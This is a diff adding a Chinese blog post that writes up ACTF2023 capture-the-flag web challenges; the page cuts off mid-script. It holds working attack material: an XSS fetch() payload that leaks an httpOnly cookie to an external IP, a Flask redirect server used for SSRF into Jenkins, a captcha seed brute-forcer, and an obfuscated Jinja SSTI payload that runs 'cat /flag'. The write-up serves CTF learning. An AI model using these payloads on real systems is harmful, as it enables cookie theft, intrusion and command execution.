@@ -1,0 +1,415 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>ACTF2023-Web | ke1nys`Blog</title><meta name="author" content="ke1nys"><meta name="copyright" content="ke1nys"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="https:&#x2F;&#x2F;su-team.cn&#x2F;passages&#x2F;2023-10-28-ACTF&#x2F; https:&#x2F;&#x2F;wm-ctf-team.feishu.cn&#x2F;docx&#x2F;PLbbdhwdyoAefuxokXwcYppzn1c https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;Mzk0NjM5OTc1NQ&#x3D;&#x3D;&amp;mid&#x3D;2247483873&amp;idx&#x3D;1&amp;sn&#x3D;3b7712">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ACTF2023-Web">
+<meta property="og:url" content="https://ke1nys.github.io/posts/c2eb5b43.html">
+<meta property="og:site_name" content="ke1nys&#96;Blog">
+<meta property="og:description" content="https:&#x2F;&#x2F;su-team.cn&#x2F;passages&#x2F;2023-10-28-ACTF&#x2F; https:&#x2F;&#x2F;wm-ctf-team.feishu.cn&#x2F;docx&#x2F;PLbbdhwdyoAefuxokXwcYppzn1c https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;Mzk0NjM5OTc1NQ&#x3D;&#x3D;&amp;mid&#x3D;2247483873&amp;idx&#x3D;1&amp;sn&#x3D;3b7712">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg">
+<meta property="article:published_time" content="2023-10-31T01:37:37.000Z">
+<meta property="article:modified_time" content="2023-11-07T14:23:59.799Z">
+<meta property="article:author" content="ke1nys">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><link rel="shortcut icon" href="/img/zhuzhu.png"><link rel="canonical" href="https://ke1nys.github.io/posts/c2eb5b43"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="manifest" href="/manifest.json"/><meta name="msapplication-TileColor" content="#3b70fc"/><link rel="apple-touch-icon" sizes="180x180" href="/img/siteicon/128.png"/><link rel="icon" type="image/png" sizes="32x32" href="/img/siteicon/32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/img/siteicon/16.png"/><link rel="mask-icon" href="/img/siteicon/128.png" color="#5bbad5"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ACTF2023-Web',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-11-07 22:23:59'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-blog@2.0.4/css/runtime/runtime.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/hexo-filter-gitcalendar/lib/gitcalendar.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ke1nys`Blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/qq.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">152</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">123</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ke1nys`Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ACTF2023-Web</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-31T01:37:37.000Z" title="发表于 2023-10-31 09:37:37">2023-10-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-07T14:23:59.799Z" title="更新于 2023-11-07 22:23:59">2023-11-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>18分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ACTF2023-Web"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><a target="_blank" rel="noopener" href="https://su-team.cn/passages/2023-10-28-ACTF/">https://su-team.cn/passages/2023-10-28-ACTF/</a></p>
+<p><a target="_blank" rel="noopener" href="https://wm-ctf-team.feishu.cn/docx/PLbbdhwdyoAefuxokXwcYppzn1c">https://wm-ctf-team.feishu.cn/docx/PLbbdhwdyoAefuxokXwcYppzn1c</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzk0NjM5OTc1NQ==&amp;mid=2247483873&amp;idx=1&amp;sn=3b771293296edae5cf913c2bc85ba1a8&amp;chksm=c307fe85f4707793149c2aeebe76c086e375f9f666c143b68556e5fa358fa62694533cc630e8&amp;mpshare=1&amp;scene=23&amp;srcid=10317I620Rz9DLyGPvjH4heX&amp;sharer_shareinfo=fa0d322996aa33d12e0962e62f42eb67&amp;sharer_shareinfo_first=fa0d322996aa33d12e0962e62f42eb67#rd">https://mp.weixin.qq.com/s?__biz=Mzk0NjM5OTc1NQ==&amp;mid=2247483873&amp;idx=1&amp;sn=3b771293296edae5cf913c2bc85ba1a8&amp;chksm=c307fe85f4707793149c2aeebe76c086e375f9f666c143b68556e5fa358fa62694533cc630e8&amp;mpshare=1&amp;scene=23&amp;srcid=10317I620Rz9DLyGPvjH4heX&amp;sharer_shareinfo=fa0d322996aa33d12e0962e62f42eb67&amp;sharer_shareinfo_first=fa0d322996aa33d12e0962e62f42eb67#rd</a></p>
+<h2 id="craftcms"><a href="#craftcms" class="headerlink" title="craftcms"></a>craftcms</h2><p>题目关了  就讲讲思路就行了</p>
+<p>这题直接搜就出来poc了</p>
+<p><a target="_blank" rel="noopener" href="http://www.bmth666.cn/2023/09/26/CVE-2023-41892-CraftCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://www.bmth666.cn/2023/09/26/CVE-2023-41892-CraftCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p>
+<p>这里是可以直接看phpinfo的  这里的话就可以看到一个有imagick这个插件  直接就p牛有一篇文章就是讲的这个</p>
+<p>这个插件的话是可以写shell的  这里直接用上面师傅给的poc就行 </p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231031195450270.png" alt="image-20231031195450270"></p>
+<p><strong>(这道题的思路其实和之前比赛的哪道题很相似来着 就是有文件包含和文件写入)</strong></p>
+<p>得写到tmp目录下  其他目录不可写</p>
+<p>这里的话其实pearcmd也行  直接去包含这个pearcmd.php文件  发现有返回结果后  直接去用就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/php/pearcmd.php</span><br></pre></td></tr></table></figure>
+<p>看完别人的wp发现  其实session临时文件上传也是可以做的</p>
+<p><a target="_blank" rel="noopener" href="https://su-team.cn/passages/2023-10-28-ACTF/">https://su-team.cn/passages/2023-10-28-ACTF/</a>  贴个链接  直接看就行了</p>
+<h2 id="easy-latex"><a href="#easy-latex" class="headerlink" title="easy latex"></a>easy latex</h2><p>题目环境关了  没办法复现了…………..</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231031212656052.png" alt="image-20231031212656052"></p>
+<p>其实关键点就在这个地方</p>
+<p>这里的话传进来的theme参数可以覆盖掉后后面的URL</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231031212910445.png" alt="image-20231031212910445"></p>
+<p>这就是关键点了  我们可以起一个服务  来测试/priview这个路由下会不会造成xss</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231031213108129.png" alt="image-20231031213108129"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231031213130554.png" alt="image-20231031213130554"></p>
+<p>发现是存在这种可能性的</p>
+<p>然后我们再来看这个note和share路由</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231031213606521.png" alt="image-20231031213606521"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231031213617498.png" alt="image-20231031213617498"></p>
+<p>相较于这个note路由  share路由是没有进行校验的  所以我们可以用这个share路由来做</p>
+<p>并且id我们是可控的  而且这个<code>req.params</code>是支持url解码的</p>
+<p>然后进入到这个visit函数</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231031213916915.png" alt="image-20231031213916915"></p>
+<p>我们是不能直接外带cookie的  因为设置了这个httpOnly</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231031214041569.png" alt="image-20231031214041569"></p>
+<p>然后再看这个vip路由  他是回拿着cookie去访问一个网站  并且将响应包返回  这里就可以帮我们把cookie带出来了</p>
+<p>所以思路就是</p>
+<p>我们通过priview路由测试得知  username可控并且可以xss  那么我们就直接再login路由的时候设置好username（因为再看vip路由的时候 username是从session中取出来的  然后再让其访问vip路由将cookie发送出来就行了）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/share/../preview?tex=awdadawd&amp;theme=//112.124.44.238:8000/a</span><br><span class="line"></span><br><span class="line">进行url全编码就行了</span><br></pre></td></tr></table></figure>
+<p>恶意js代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fetch(&#x27;/login&#x27;,&#123;</span><br><span class="line">    method:&quot;POST&quot;,</span><br><span class="line">    redirect:&quot;follow&quot;,</span><br><span class="line">    headers: &#123;</span><br><span class="line">        &#x27;Content-Type&#x27;: &quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    body:&quot;username=http://114.116.119.253:7777&amp;password=c2ceb7948ba609ad5f728c96cae769ba&quot;</span><br><span class="line">&#125;);</span><br><span class="line">console.log(&#x27;first&#x27;);</span><br><span class="line">function exp()&#123;</span><br><span class="line">fetch(&#x27;/vip&#x27;,&#123;</span><br><span class="line">    method:&quot;POST&quot;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+<p>然后这样就结束了</p>
+<p> 其他wp也有其他方式的js文件  自己去查来看看就行了</p>
+<h2 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h2><p>环境也关了………………</p>
+<p>这道题的话其实信息检索能力到位的话  是很容易就出的</p>
+<p><a target="_blank" rel="noopener" href="https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/">https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=wrRha2vwv6Q">https://www.youtube.com/watch?v=wrRha2vwv6Q</a></p>
+<p>特别是这个youtube视频  如果当时查到的话必出  </p>
+<p>webhooks这个东西的话github和gitlab是各有一个  只不过GitHub的是只能post发包  gitlab的话是可以get发包</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231031220135615.png" alt="image-20231031220135615"></p>
+<p>就是这个玩意</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231031220915012.png" alt="image-20231031220915012"></p>
+<p>gitlab里面也是有一个webhooks</p>
+<p>就是现在服务器上搭建一个flask服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, redirect, request</span><br><span class="line">from urllib.parse import unquote</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.post(&#x27;/redirect&#x27;)</span><br><span class="line">def perform_redirect():</span><br><span class="line">    redirect_url = request.args.get(&#x27;redirect_url&#x27;)</span><br><span class="line">    if redirect_url:</span><br><span class="line">        return redirect(redirect_url, code=302)</span><br><span class="line">    else:</span><br><span class="line">        return &quot;Missing &#x27;redirect_url&#x27; parameter&quot;, 400</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(&quot;0.0.0.0&quot;, port =1234, debug=True)</span><br></pre></td></tr></table></figure>
+<p>然后再使用gitlab的webhooks发包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.42.39.110:1234/redirect?redirect_url=题目地址</span><br></pre></td></tr></table></figure>
+<p>然后就会返回告诉你</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231031222011605.png" alt="image-20231031222011605"></p>
+<p>这次的话就可以直接贴内网地址了 <code>http://jenkins:8080/</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.42.39.110:1234/redirect?redirect_url=题目地址&amp;redirect_url=http://jenkins:8080/</span><br></pre></td></tr></table></figure>
+<p>然后就会返回jenkins的版本号  然后我们直接去找poc打就出了</p>
+<p>CVE-2019-100030洞是这个  接下去找这个poc来打就ok了</p>
+<h2 id="Story"><a href="#Story" class="headerlink" title="Story"></a>Story</h2><p>这个题考的就是之前p牛发的文章里的那个<code>jumpserver</code>随机数预测</p>
+<p>漏洞点就在这个key处</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231031222936757.png" alt="image-20231031222936757"></p>
+<p><code>random.randint(1,100)</code>这个代码的话是生成1-100之间的随机数  并且这个time.time()的话是生成时间戳  </p>
+<p>key的话是时间戳加上随机数  这样是可以爆破出来的</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231031223548962.png" alt="image-20231031223548962"></p>
+<p>访问一次captcha的话就会返回code  并且种子是全局播种的</p>
+<p>那么我们就可以去看看其code是怎么生成的</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231031223640032.png" alt="image-20231031223640032"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231031223648359.png" alt="image-20231031223648359"></p>
+<p>就是随机生成四位随机数</p>
+<p>爆破seed脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">while True:</span><br><span class="line">    now = int(time.time())</span><br><span class="line">    session = requests.session()</span><br><span class="line">    all = 0</span><br><span class="line">    payload = &#x27;123&#x27;</span><br><span class="line">    res = session.get(url+&#x27;captcha&#x27;)</span><br><span class="line">    for i in range(1,100):</span><br><span class="line">        gen = Captcha(200, 80,now+i)</span><br><span class="line">        buf , captcha_text = gen.generate()</span><br><span class="line">        if(buf.getvalue()==res.content):</span><br><span class="line">            print(now+i)</span><br><span class="line">            seed = now+i</span><br><span class="line">            print(&#x27;success&#x27;)</span><br></pre></td></tr></table></figure>
+<p>然后在获取到seed后  如何使必须得成为vip才能进行story参数的传参</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231101103601451.png" alt="image-20231101103601451"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231101102802056.png" alt="image-20231101102802056"></p>
+<p>这里是第二获取到这个code  因为外面已经获取到了这个seed  那么这个code我们在本地就可以运行得出</p>
+<p>然后传上去就能获取到vip了</p>
+<p>在成为vip之后  我们就可以进行story的传参</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231101103650543.png" alt="image-20231101103650543"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231101103726674.png" alt="image-20231101103726674"></p>
+<p>这个对参数的过滤很有意思   是在6条规则中随机挑选3条  那么就存在三条一样的情况  那么我们就直接在本地进行测试  看看第几次的时候才能存在三条规则一样的情况  <strong>(这里选的是第一条)</strong></p>
+<p>然后我们在写脚本循环访问x-1次  然后最后一次的时候再用payload去打就行了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231101103843923.png" alt="image-20231101103843923"></p>
+<p>ssti的payload  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set zero = (self|int) %&#125;&#123;% set one = (zero**zero)|int %&#125;&#123;% set two = (zero-one-one)|abs %&#125;&#123;% set four = (two*two)|int %&#125;&#123;% set five = (two*two*two)-one-one-one %&#125;&#123;% set three = five-one-one %&#125;&#123;% set nine = (two*two*two*two-five-one-one) %&#125;&#123;% set seven = (zero-one-one-five)|abs %&#125;&#123;% set space = self|string|min %&#125;&#123;% set point = self|float|string|min %&#125;&#123;% set c = dict(c=aa)|reverse|first %&#125;&#123;% set bfh = self|string|urlencode|first %&#125;&#123;% set bfhc = bfh~c %&#125;&#123;% set slas = bfhc%((four~seven)|int) %&#125;&#123;% set yin = bfhc%((three~nine)|int) %&#125;&#123;% set xhx = bfhc%((nine~five)|int) %&#125;&#123;% set right = bfhc%((four~one)|int) %&#125;&#123;% set left = bfhc%((four~zero)|int) %&#125;&#123;% set but = dict(buil=aa,tins=dd)|join %&#125;&#123;% set imp = dict(imp=aa,ort=dd)|join %&#125;&#123;% set pon = dict(po=aa,pen=dd)|join %&#125;&#123;% set so = dict(o=aa,s=dd)|join %&#125;&#123;% set ca = dict(ca=aa,t=dd)|join %&#125;&#123;% set flg = dict(fl=aa,ag=dd)|join %&#125;&#123;% set ev = dict(ev=aa,al=dd)|join %&#125;&#123;% set red = dict(re=aa,ad=dd)|join %&#125;&#123;% set bul = xhx~xhx~but~xhx~xhx %&#125;&#123;% set ini = dict(ini=aa,t=bb)|join %&#125;&#123;% set glo = dict(glo=aa,bals=bb)|join %&#125;&#123;% set itm = dict(ite=aa,ms=bb)|join %&#125;&#123;% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~flg~yin~right~point~red~left~right %&#125;&#123;% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;&#123;% if f == bul %&#125;&#123;% for a,b in (v|attr(itm))() %&#125;&#123;% if a == ev %&#125;&#123;&#123;b(pld)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>testminic  (用来判断什么时候存在三条一样的rule1)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">rule = [</span><br><span class="line">    